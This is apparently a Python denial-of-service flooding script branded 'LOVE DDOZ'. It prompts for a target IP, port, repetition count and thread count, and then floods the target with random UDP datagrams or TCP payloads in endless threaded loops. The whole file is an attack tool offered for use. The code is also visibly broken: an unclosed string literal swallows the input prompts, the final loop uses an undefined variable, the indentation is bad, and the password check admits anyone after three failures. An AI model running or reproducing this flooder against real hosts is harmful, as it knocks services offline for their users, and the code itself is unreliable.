import random
import socket
import time
import threading
import os , sys , codecs

os.system("clear")
print("""\033[95m
 __    _____  _  _  ____ 
(  )  (  _  )( \/ )( ___)
 )(__  )(_)(  \  /  )__) 
(____)(_____)  \/  (____)
""")

password ="love"

for i in range(3):
	pwd = input("\033[97m[¿] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[97m[?] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] Wrong Password : ")
		continue
time.sleep(5)
print("\033[97m[•] Login \033[92mAuthorized!!! ")
time.sleep(5)
os.system("clear")

print("""
\033[91m __    _____  _  _  ____ 
(  )  (  _  )( \/ )( ___)
 )(__  )(_)(  \  /  )__) 
(____)(_____)  \/  (____)
\033[21m ____  ____  _____  ____ 
(  _ \(  _ \(  _  )(_   )
 )(_) ))(_) ))(_)(  / /_ 
(____/(____/(_____)(____)
\n""") 
print("""
\033[95 [•] Code : ZieLx
 [$] METHOD : UDP 
 [#] DC : Z1#7872

ip =str(input("\033[96m[1] Ip Target :\033[91m "))
port =int(input("\033[96m[2] Port Target : \033[91m"))
times =int(input("\033[96m[3] Times :\033[91m "))
threads =int(input("\033[96m[4] Threads :\033[91m "))
choice =str(input("\033[96m[5] Ready? (y/n) :\033[91m "))

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mSend Attack!!! \033[97m>>> \033[95m{}:{}".format(ip,port))
		except:
			print("\033[31m[?] Connection Time Out")

def run2():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[91mSend Attack!!! \033[97m>>> \033[95m{}:{}".format(ip,port)) 
		except:
			s.close()
			print("\033[31m[?] Connection Time Out") 

for y in range(size):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
      else:
		th = threading.Thread(target = run2)
		th.start()
			
